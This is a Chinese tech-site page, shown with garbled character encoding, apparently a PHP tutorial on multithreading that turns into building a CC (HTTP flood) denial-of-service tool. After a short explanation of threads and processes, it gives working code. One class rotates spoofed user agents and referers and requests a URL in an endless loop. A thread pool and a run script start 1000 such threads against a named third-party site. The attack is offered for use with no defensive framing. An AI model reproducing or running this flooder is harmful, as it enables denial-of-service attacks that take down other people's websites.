<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚ | æå®¢å¿«è¨Š</title><meta property="og:title" content="PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚ - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p3.pstatp.com/large/pgc-image/cce9b3fb23ce41b88311823510e419da"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/cd56e2f3.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/cd56e2f3.html><meta property="article:published_time" content="2020-11-14T21:07:27+08:00"><meta property="article:modified_time" content="2020-11-14T21:07:27+08:00"><meta name=Keywords content><meta name=description content="PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/cd56e2f3.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è®¯ Geek Bank</a></h1><p class=description>ä¸ºä½ å¸¦æ¥æœ€å…¨çš„ç§‘æŠ€çŸ¥è¯† ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚</h1></header><date class="post-meta meta-date">2020-11-14</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><p><strong>çº¿ç¨‹</strong></p><p>çº¿ç¨‹ä¸è¿›ç¨‹æœ‰å¾ˆå¤šç±»ä¼¼çš„åœ°æ–¹ï¼Œä½†æ˜¯ä¹Ÿæœ‰éƒ¨åˆ†ä¸ä¸€æ ·ã€‚åœ¨è®²è¿›ç¨‹çš„æ—¶å€™æˆ‘ä»¬ç»™å¤§å®¶çœ‹è¿‡ä¸€å¼ å›¾ã€‚</p><div class=pgc-img><img alt=PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/cce9b3fb23ce41b88311823510e419da><p class=pgc-img-caption></p></div><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºæ¥çº¿ç¨‹æ˜¯åœ¨è¿›ç¨‹å†…åˆ›å»ºçš„ï¼Œä¹Ÿå°±è¯´å¤šä¸ªçº¿ç¨‹å…±äº«ä¸€ä¸ªè¿›ç¨‹å†…çš„èµ„æºï¼›åŒ…æ‹¬å†…å­˜ã€åœ°å€ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ç­‰ç­‰ã€‚ä½¿ç”¨å¤šçº¿ç¨‹æ˜¯æ— åºæ‰§è¡Œçš„ï¼Œçº¿ç¨‹çš„è°ƒåº¦å’Œè¿›ç¨‹ä¸€æ ·ï¼Œç”±æ“ä½œç³»ç»Ÿæ¥è°ƒåº¦ï¼Œå› æ­¤ä»€ä¹ˆæ—¶å€™æ‰§è¡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“ã€‚æœ‰ä¸€å¥è¯å¯ä»¥æ¦‚æ‹¬ï¼šçº¿ç¨‹å°±æ˜¯æ›´è½»é‡çš„è¿›ç¨‹ã€‚</p><p><strong>çº¿ç¨‹</strong></p><ol start=1><li>ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹</li><li>åŒä¸€ä¸ªè¿›ç¨‹å†…çš„å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä»½èµ„æº</li><li>æ–‡ä»¶æè¿°ç¬¦è¡¨</li><li>ä¿¡å·å¤„ç†æ–¹å¼</li><li>å½“å‰å·¥ä½œç›®å½•</li><li>å†…å­˜åœ°å€ç©ºé—´</li></ol><p>æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„ç‹¬ç«‹æ ˆï¼Œä¹Ÿå°±æ˜¯çº¿ç¨‹å†…éƒ¨çš„å˜é‡å…¶ä»–çº¿ç¨‹æ‹¿ä¸åˆ°ï¼Œé™¤éæ˜¯åœ¨è¿›ç¨‹å†…çš„å…¨å±€å˜é‡ã€‚</p><p>æ—¢ç„¶æœ‰äº†å¤šè¿›ç¨‹ä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦å¤šçº¿ç¨‹ï¼Ÿè¿›ç¨‹åœ¨é‡åˆ°IOä¼šé˜»å¡ï¼Œåé¢çš„ä»£ç æ— æ³•æ‰§è¡Œï¼Œè¿™æ—¶å€™CPUå¤„äºç©ºè·‘çŠ¶æ€ï¼Œä¸ºäº†å……åˆ†çš„åˆ©ç”¨CPUï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠé‡åˆ°IOé˜»å¡çš„è¿›ç¨‹æŒ‚èµ·ï¼Œåˆ‡æ¢åˆ°å…¶ä»–è¿›ç¨‹ã€‚</p><p><strong>è¿›ç¨‹ä¸Šä¸‹æ–‡</strong></p><div class=pgc-img><img alt=PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ad2212eac662448cbbffd83ea9baf604><p class=pgc-img-caption></p></div><p><strong>çº¿ç¨‹ä¸Šä¸‹æ–‡</strong></p><div class=pgc-img><img alt=PHPè¿›é˜¶æ•™ç¨‹-PHPè¿˜èƒ½ç©å¤šçº¿ç¨‹ï¼Ÿçœ‹æˆ‘æ€ä¹ˆç”¨å¤šçº¿ç¨‹å®ç°CCæ”»å‡»å™¨ã€‚ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/fec8823ea6ce4e41bc2246e9c72ce087><p class=pgc-img-caption></p></div><p>æ“ä½œç³»ç»Ÿä¼šç»™æ¯ä¸€ä¸ªè¿›ç¨‹åˆ†é…ç»™å¯ç”¨çš„æ—¶é—´ç‰‡ï¼Œå°±æ˜¯æ¯ä¸ªè¿›ç¨‹æ¯æ¬¡è¿è¡Œå¤šä¹…ï¼Œä¾‹å¦‚ï¼šCPUç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…äº†10msçš„æ—¶é—´ï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œåˆ°3msçš„æ—¶å€™å‘ç”Ÿäº†IOé˜»å¡æ€ä¹ˆåŠå‘¢ï¼Ÿåœ¨å•çº¿ç¨‹çš„æƒ…å†µä¸‹ï¼Œä¼šè¢«åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹ä¼šè¢«æŒ‚èµ·ã€‚è€Œå¤šçº¿ç¨‹å‘¢ï¼Œæ˜¯å°½å¯èƒ½çš„åˆ©ç”¨å®ŒCPUç»™è¿™ä¸ªè¿›ç¨‹åˆ†é…çš„æ—¶é—´ç‰‡ã€‚</p><p>ä¸¾ä¸ªâ€œæ —å­â€ï¼Œå¾®ä¿¡æˆ‘ä»¬å¤§å®¶éƒ½åœ¨ç”¨ï¼Œå¾®ä¿¡å¾ˆæ˜¾ç„¶å°±æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹ç¨‹åºï¼Œä¸ºä»€ä¹ˆè¿™æ ·è¯´å‘¢ï¼Ÿæˆ‘ä»¬åœ¨è·Ÿåˆ«äººè§†é¢‘çš„æ—¶å€™åŒæ—¶è¿˜å¯ä»¥è·Ÿå…¶ä»–äººèŠå¤©ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è¾“å…¥æ³•è¾“å…¥æ–‡å­—ï¼Œé€‰æ‹©è¡¨æƒ…ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è·Ÿåˆ«äººè§†é¢‘çš„æ—¶å€™è¿™ä¸ªçº¿ç¨‹å°±ä¼šé˜»å¡ï¼Œæˆ‘ä»¬çœ‹åˆ°å¾®ä¿¡çš„ç•Œé¢å°±ä¼šå¡æ­»ã€‚</p><p>ä¸€ä¸ªçº¿ç¨‹é‡åˆ°é˜»å¡çš„æ—¶å€™ï¼Œä¼šåœ¨åŒä¸€ä¸ªè¿›ç¨‹å†…çš„å…¶ä»–ç©ºé—²çº¿ç¨‹åˆ‡æ¢ï¼Œè¿™æ ·çš„åˆ‡æ¢åªè¦æ¶ˆè€—çº¿ç¨‹æ ˆå¼€é”€ï¼Œå› æ­¤å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éƒ½è¯´çº¿ç¨‹æ˜¯è½»é‡çº§çš„è¿›ç¨‹ã€‚</p><p>å› æ­¤éœ€è¦æŠŠä¸€ä¸ªè¿›ç¨‹é‡Œé¢çš„ä»»åŠ¡å†æ¬¡åˆ†å‰²æˆä»»åŠ¡ç‰‡ï¼Œç±»ä¼¼CPUåˆ†å‡ºæ¥çš„æ—¶é—´ç‰‡ä¸€æ ·ï¼Œåˆ†æˆå¤šå°‘ä»½å°±å¼€å¤šå°‘ä¸ªçº¿ç¨‹ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šçº¿ç¨‹æ¥å®ç°ä¸€ä¸ªCCæ”»å‡»å™¨ã€‚</p><p><strong>å®æˆ˜ï¼šCCæ”»å‡»å™¨</strong></p><p>CCæ”»å‡»å°±æ˜¯ä¸€ç§åˆ¶é€ å¤§é‡è®¿é—®å¯¼è‡´å¯¹æ–¹æœåŠ¡å™¨èµ„æºè€—å°½æ— æ³•æä¾›æœåŠ¡çš„ä¸€ç§æ‰‹æ®µï¼Œè¿™é‡Œç”¨ç®€å•çš„æ–¹å¼å®ç°ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹+çº¿ç¨‹æ± +curlå®ç°ä¸€ä¸ªç®€å•çš„ccæ”»å‡»ã€‚</p><p><br></p><p>æ‰©å±•ä¸‹è½½åœ°å€ï¼š</p><pre><code>https://github.com/krakjoe/pthreads.git</code></pre><p><strong>cc.php</strong></p><pre><code>&lt;?phpclass CC extends Thread{    // è¦æ”»å‡»çš„url    private $url;    // è¦æ”»å‡»çš„åŸŸå    private $host;    // user-agent    private $userAgent = [        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 MicroMessenger/5.2.380',        'Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',        'Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,likeGecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',        'Mozilla/5.0 (compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 likeMac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider'    ];    // æ¨¡æ‹Ÿè¯·æ±‚æ¥æº    private $referers = array(        'https://www.baidu.com?k=',        'https://www.sogou.com?keyword=',        'https://www.so.com?keyword=',        'https://www.google.com?k=',        'https://m.baidu.com?keyword=',        'https://m.sogou.com?keyword=',        'https://m.so.com?key='    );    public function __construct($url)    {        $this-&gt;url = $url;        $this-&gt;parserUrl();    }    /**     * è§£æhost     */    private function parserUrl()    {        $parser = parse_url($this-&gt;url);        $this-&gt;host = $parser['host'];    }    /**     * è·å–å¤´ä¿¡æ¯     * @return void     */    private function getHeader(){        $referer = $this-&gt;referers[mt_rand(0,count($this-&gt;referers))];        $userAgent = $this-&gt;userAgent[mt_rand(0,count($this-&gt;userAgent))];        return [            'Host'=&gt;$this-&gt;host,            'Referer'=&gt;$referer,            'User-Agent'=&gt;$userAgent,            'Accept'=&gt;'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',            'Accept-Language'=&gt;' en-US,en;q=0.5',            'Accept-Charset'=&gt;'iso-8859-1',            'Accept-Encoding'=&gt;'gzip',            'Connection'=&gt;'Keep-Alive'        ];    }        /**     * å®ç°è®¿é—®     */    public function request()    {        $header = $this-&gt;getHeader();        $curl = curl_init();        // CURLå¤´ä¿¡æ¯è®¾ç½®        curl_setopt($curl, CURLOPT_HTTPHEADER, $header);        curl_setopt($curl, CURLOPT_URL, $this-&gt;url);        curl_setopt($curl, CURLOPT_TIMEOUT, 30);        curl_setopt($curl, CURLOPT_HEADER, false);        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);        $res = curl_exec($curl);        var_dump($res);        curl_close($curl);    }    public function run()    {        while(true){            $this-&gt;request();            sleep(0.3);        }    }}</code></pre><p><strong>threadPool.php</strong></p><pre><code>&lt;?phpclass ThreadPool{    public $pool = array();    private $url;	public function __construct($url,$count) {        $this-&gt;url = $url;        $this-&gt;count = $count;	}	public function push(){		if(count($this-&gt;pool) &lt; $this-&gt;count){			$this-&gt;pool[] = new CC($this-&gt;url);			return true;		}else{			return false;		}	}	public function start(){		foreach ( $this-&gt;pool as $id =&gt; $worker){			$this-&gt;pool[$id]-&gt;start();		}	}	public function join(){		foreach ( $this-&gt;pool as $id =&gt; $worker){               $this-&gt;pool[$id]-&gt;join();		}	}}</code></pre><p><strong>run.php</strong></p><pre><code>&lt;?phprequire 'cc.php';require 'threadPool.php';$count = 1000;$pool = new ThreadPool('http://www.vxwei.com/index.php',$count);for($i=0;$i&lt;$count;$i++){    $pool-&gt;push();}$pool-&gt;start();$pool-&gt;join();</code></pre><p>å¦‚æœå–œæ¬¢æˆ‘çš„æ–‡ç« è¯·è½¬å‘æœ‹å‹åœˆç‚¹å…³æ³¨ï¼Œä¸€å¿ƒåªåšåŸåˆ›æ–‡ç« ã€‚</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'PHP','å¤šçº¿ç¨‹','è¿›é˜¶'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>